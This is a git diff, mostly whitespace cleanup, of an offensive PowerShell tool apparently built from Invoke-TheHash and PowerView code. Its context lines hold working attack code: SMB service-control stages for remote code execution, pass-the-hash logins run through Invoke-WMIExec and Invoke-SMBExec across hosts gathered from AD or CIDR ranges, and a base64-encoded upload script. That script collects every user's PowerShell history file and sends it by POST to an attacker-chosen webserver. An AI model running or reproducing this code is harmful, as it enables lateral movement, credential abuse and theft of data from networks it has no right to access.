                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
 
                             if($SMB_signing)
                             {
-                                $SMB2_sign = $SMB2_header + $SMB2_data 
+                                $SMB2_sign = $SMB2_header + $SMB2_data
                                 $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                 $SMB2_signature = $SMB2_signature[0..15]
                                 $packet_SMB2_header["Signature"] = $SMB2_signature
                                 $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                             }
 
-                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
+                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                             $stage = 'SendReceive'
                         }
-                    
+
                         'RPCBind'
                         {
                             $stage_current = $stage
                             $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                        
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
 
                             $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $named_pipe_UUID 0x02,0x00
                             $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                             $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
+                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                             $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -4314,7 +4314,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 
                         'StartServiceW'
                         {
-                        
+
                             if([System.BitConverter]::ToString($client_receive[132..135]) -eq '00-00-00-00')
                             {
                                 Write-Verbose "Service $SMB_service created on $Target"
@@ -4322,10 +4322,10 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                                 $stage_current = $stage
                                 $message_ID++
                                 $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                            
+
                                 if($SMB_signing)
                                 {
-                                    $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                    $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                                 }
 
                                 $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
@@ -4334,7 +4334,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                                 $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                                 $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                                 $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data   
+                                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                                 $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                                 $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                                 $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -4362,13 +4362,13 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                                 Write-Output "[-] Service creation fault context mismatch"
                                 $stage = 'Exit'
                             }
-    
+
                         }
-                
+
                         'StatusPending'
                         {
                             $client_stream.Read($client_receive,0,$client_receive.Length) > $null
-                            
+
                             if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                             {
                                 $stage = 'StatusReceived'
@@ -4435,7 +4435,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                                         $SMB_split_stage = 2
                                         $stage = 'CreateServiceW_Middle'
                                     }
-                                    
+
                                 }
 
                                 'CreateServiceW_Middle'
@@ -4473,7 +4473,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                                 'OpenSCManagerW'
                                 {
                                     $stage = 'ReadRequest'
-                                    $stage_next = 'CheckAccess' 
+                                    $stage_next = 'CheckAccess'
                                 }
 
                                 'ReadRequest'
@@ -4490,7 +4490,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                                 'StartServiceW'
                                 {
                                     $stage = 'ReadRequest'
-                                    $stage_next = 'DeleteServiceW'  
+                                    $stage_next = 'DeleteServiceW'
                                 }
 
                                 'TreeConnect'
@@ -4516,7 +4516,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             }
 
                         }
-                    
+
                         'TreeConnect'
                         {
                             $tree_ID = $client_receive[40..43]
@@ -4526,18 +4526,18 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
 
                             $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
+                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
 
                             if($SMB_signing)
                             {
-                                $SMB2_sign = $SMB2_header + $SMB2_data 
+                                $SMB2_sign = $SMB2_header + $SMB2_data
                                 $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                 $SMB2_signature = $SMB2_signature[0..15]
                                 $packet_SMB2_header["Signature"] = $SMB2_signature
@@ -4566,7 +4566,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                                 Write-Output "[-] Session connection is closed"
                                 $stage = 'Exit'
                             }
-                            
+
                         }
 
                         'TreeDisconnect'
@@ -4574,12 +4574,12 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $stage_current = $stage
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                        
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
-            
+
                             $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                             $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
@@ -4598,9 +4598,9 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                             $stage = 'SendReceive'
                         }
-    
+
                     }
-                
+
                 }
 
             }
@@ -4608,7 +4608,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
             {
                 Write-Output "[-] $($_.Exception.Message)"
             }
-        
+
         }
 
     }
@@ -4633,7 +4633,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 #######################END OF CODE COPIED FROM Invoke-TheHash #######################
 ############################### Thanks Kevin Robertson!!! ##########################
 
-#Gen-EncodedUploadScript generates a PowerShell encoded command to use with WMIExec or SMBExec to exfil a file to a webserver. 
+#Gen-EncodedUploadScript generates a PowerShell encoded command to use with WMIExec or SMBExec to exfil a file to a webserver.
 
 Function Gen-EncodedUploadScript{
 
@@ -4645,7 +4645,7 @@ Function Gen-EncodedUploadScript{
     )
 $UnencodedCommand = {
 
-######## Manually change the URL here for now until I figure out 
+######## Manually change the URL here for now until I figure out
 ########how to pass the variable into this part that gets encoded
 ########See the Readme for server setup.
 $Url = "https://<this-is-the-server-you-setup-address>/index.php"
@@ -4657,7 +4657,7 @@ $hostname = [System.Net.Dns]::GetHostName()
 foreach($profile in $UserProfiles){
     $ReadLineExists = Test-Path C:\Users\$profile\appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine
     if ($ReadLineExists){
-    
+
     $FilePath = "C:\Users\$profile\appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
     #Building the body of a POST request to server.
     $boundary = [Guid]::NewGuid().ToString()
@@ -4700,8 +4700,8 @@ $requestInFile = (Join-Path -Path $env:TEMP -ChildPath ([IO.Path]::GetRandomFile
     }
 }
 }
-    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($UnencodedCommand) 
-    $Base64 = [Convert]::ToBase64String($Bytes) 
+    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($UnencodedCommand)
+    $Base64 = [Convert]::ToBase64String($Bytes)
 
     return $Base64
 }
@@ -4719,7 +4719,7 @@ if ($Protocol -eq "WMI")
                                 if ($UserDomain){
                                     #Write-Verbose  "[*] Now checking $target.`r`n"
                                     $WMIConnectResult = Invoke-WMIExec -Target $Target -Domain $UserDomain -Username $username -Hash $passwordhash
-                                    
+
                                     #$count++
                                 }
                                 else{
@@ -4727,9 +4727,9 @@ if ($Protocol -eq "WMI")
                                     $WMIConnectResult = Invoke-WMIExec -Target $Target -Username $Username -Hash $PasswordHash
                                     #$count++
                                 }
-    
+
                                 #Checking output of Invoke-WMIExec to determine if successful or not
-                                
+
                                 if($WMIConnectResult -match "accessed"){
                                    #$successcount++
                                    if($ExfilPSReadline){
@@ -4742,10 +4742,10 @@ if ($Protocol -eq "WMI")
                                    }
 
                                 }
-                                
+
                             }
                         }
-                        
+
                         #Write-Output "A total of $successcount hosts were accessed successfully."
                     }
                     elseif($Protocol -eq "SMB")
@@ -4768,7 +4768,7 @@ if ($Protocol -eq "WMI")
                                         $SMBConnectResult = Invoke-SMBExec -Target $Target -Username $Username -Hash $PasswordHash -ErrorAction SilentlyContinue
                                         $count++
                                     }
-    
+
                                     #Checking output of Invoke-SMBExec to determine if successful or not
                                     if($SMBConnectResult -match "has Service Control Manager write privilege"){
                                         #$successcount++
@@ -4781,17 +4781,17 @@ if ($Protocol -eq "WMI")
                                         Write-Output "[*] Successfuly accessed $Target as admin."
                                         }
                                     }
-            
+
                                 }
                         #Write-Output "A total of $successcount hosts were accessed successfully."
                         }
                     }
 
-            
+
             }
 
-           
- 
+
+
         $successcount = 0
 
         #### Get all computers or just check one system or specify hostlist in cidr format
@@ -4806,7 +4806,7 @@ if ($Protocol -eq "WMI")
             $counttotal = $hostlist.count
             Write-Output ("[*] Found a total of " + $hostlist.count +" systems.")
             }
-            
+
             if($Threads) {
             Write-Verbose "Using threading with threads = $Threads"
 
@@ -4819,47 +4819,47 @@ if ($Protocol -eq "WMI")
                 'Protocol' = $Protocol
                 'counttotal' = $counttotal
                 'ExfilPSReadline' = $ExfilPSReadline
-                       
-        
+
+
             }
 
-            # kick off the threaded script block + arguments           
-            
+            # kick off the threaded script block + arguments
+
             Invoke-ThreadedFunction -ScriptBlock $LocalAdminCheckBlock -ScriptParameters $ScriptParams -ComputerName $hostlist -Threads $Threads
             }
             else{
             Invoke-Command -ScriptBlock $LocalAdminCheckBlock -ArgumentList $hostlist, $Username, $PasswordHash, $UserDomain, $Protocol, $counttotal
-            }      
-            
+            }
+
         }
         elseif ($cidr){
             ###Hostlist generator taken from @rvrsh3ll Find-Fruit.ps1 - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Find-Fruit.ps1
-  
+
                 $hostList = New-Object System.Collections.ArrayList
-        
+
                 $iHosts = $CIDR -split ","
-        
+
                 foreach ($iHost in $iHosts) {
                     $iHost = $iHost.Replace(" ", "")
-            
+
                     if (!$iHost) {
                         continue
                     }
-            
+
                     if ($iHost.contains("/")) {
                         $netPart = $iHost.split("/")[0]
                         [uint32]$maskPart = $iHost.split("/")[1]
-                
+
                         $address = [System.Net.IPAddress]::Parse($netPart)
                         if ($maskPart -ge $address.GetAddressBytes().Length * 8) {
                             throw "Bad host mask"
                         }
-                
+
                         $numhosts = [System.math]::Pow(2, (($address.GetAddressBytes().Length * 8) - $maskPart))
-                
+
                         $startaddress = $address.GetAddressBytes()
                         [array]::Reverse($startaddress)
-                
+
                         $startaddress = [System.BitConverter]::ToUInt32($startaddress, 0)
                         [uint32]$startMask = ([System.math]::Pow(2, $maskPart) - 1) * ([System.Math]::Pow(2, (32 - $maskPart)))
                         $startAddress = $startAddress -band $startMask
@@ -4867,9 +4867,9 @@ if ($Protocol -eq "WMI")
                         $startAddress = [System.BitConverter]::GetBytes($startaddress)[0..3]
                         [array]::Reverse($startaddress)
                         $address = [System.Net.IPAddress][byte[]]$startAddress
-                
+
                         $Null = $hostList.Add($address.IPAddressToString)
-                
+
                         for ($i = 0; $i -lt $numhosts - 1; $i++) {
                             $nextAddress = $address.GetAddressBytes()
                             [array]::Reverse($nextAddress)
@@ -4878,15 +4878,15 @@ if ($Protocol -eq "WMI")
                             $nextAddress = [System.BitConverter]::GetBytes($nextAddress)[0..3]
                             [array]::Reverse($nextAddress)
                             $address = [System.Net.IPAddress][byte[]]$nextAddress
-                            $Null = $hostList.Add($address.IPAddressToString)       
+                            $Null = $hostList.Add($address.IPAddressToString)
                         }
-                                       
+
                     }
                     else {
-                        $Null = $hostList.Add($iHost) 
+                        $Null = $hostList.Add($iHost)
                     }
                 }
-            
+
             $counttotal = $hostlist.count
             Write-Output ("[*] Found a total of " + $hostlist.count +" systems.")
             if($Threads) {
@@ -4900,19 +4900,19 @@ if ($Protocol -eq "WMI")
                 'UserDomain' = $UserDomain
                 'Protocol' = $Protocol
                 'counttotal' = $counttotal
-                       
-        
+
+
             }
 
-            # kick off the threaded script block + arguments           
-            
+            # kick off the threaded script block + arguments
+
             Invoke-ThreadedFunction -ScriptBlock $LocalAdminCheckBlock -ScriptParameters $ScriptParams -ComputerName $hostlist -Threads $Threads
             }
             else{
             Invoke-Command -ScriptBlock $LocalAdminCheckBlock -ArgumentList $hostlist, $Username, $PasswordHash, $UserDomain, $Protocol, $counttotal
-            }      
-            
- 
+            }
+
+
         }
         elseif($targetsystem)
         {
@@ -4934,17 +4934,17 @@ if ($Protocol -eq "WMI")
                 'UserDomain' = $UserDomain
                 'Protocol' = $Protocol
                 'counttotal' = $counttotal
-                       
-        
+
+
             }
 
-            # kick off the threaded script block + arguments           
-            
+            # kick off the threaded script block + arguments
+
             Invoke-ThreadedFunction -ScriptBlock $LocalAdminCheckBlock -ScriptParameters $ScriptParams -ComputerName $hostlist -Threads $Threads
             }
             else{
             Invoke-Command -ScriptBlock $LocalAdminCheckBlock -ArgumentList $hostlist, $Username, $PasswordHash, $UserDomain, $Protocol, $counttotal
-            }      
+            }
         }
 }
 
@@ -6221,9 +6221,9 @@ function Get-DomainComputer {
 
 Return all computers or specific computer objects in AD.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty
 
 .DESCRIPTION
 
@@ -6616,9 +6616,9 @@ function Get-DomainSearcher {
 
 Helper used by various functions that builds a custom AD searcher object.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Domain  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Get-Domain
 
 .DESCRIPTION
 
@@ -6898,9 +6898,9 @@ function Convert-LDAPProperty {
 Helper that converts specific LDAP property result fields and outputs
 a custom psobject.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -7022,9 +7022,9 @@ function Get-Domain {
 
 Returns the domain object for the current (or specified) domain.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: None
 
 .DESCRIPTION
 
@@ -7394,12 +7394,12 @@ function Invoke-ThreadedFunction {
     }
 
     process {
-        
+
         ##I was running into a weird issue where the first set of threads were not providing results.
         ##A super hacky and terrible fix was to just spin up the number of threads specified with localhost as target.
         ##localhost never actually gets scanned it just runs "Get-Date" for each thread and for whatever reason all the
         ##other threads appear to work now... ¯\_(ツ)_/¯ @dafthack
-        
+
         $countb= 0
         while($countb -lt $threads){
 
@@ -7431,7 +7431,7 @@ function Invoke-ThreadedFunction {
             }
             $Counter = $Counter + 1
             $countb++}
-        
+
         ##Now that the threads are "warmed up" it actually does the real threading...
 
         ForEach ($Computer in $ComputerName) {
@@ -7489,7 +7489,7 @@ function Invoke-ThreadedFunction {
                 $PS[$y].Dispose()
             }
         }
-        
+
         $Pool.Dispose()
         Write-Verbose "All threads completed!"
     }
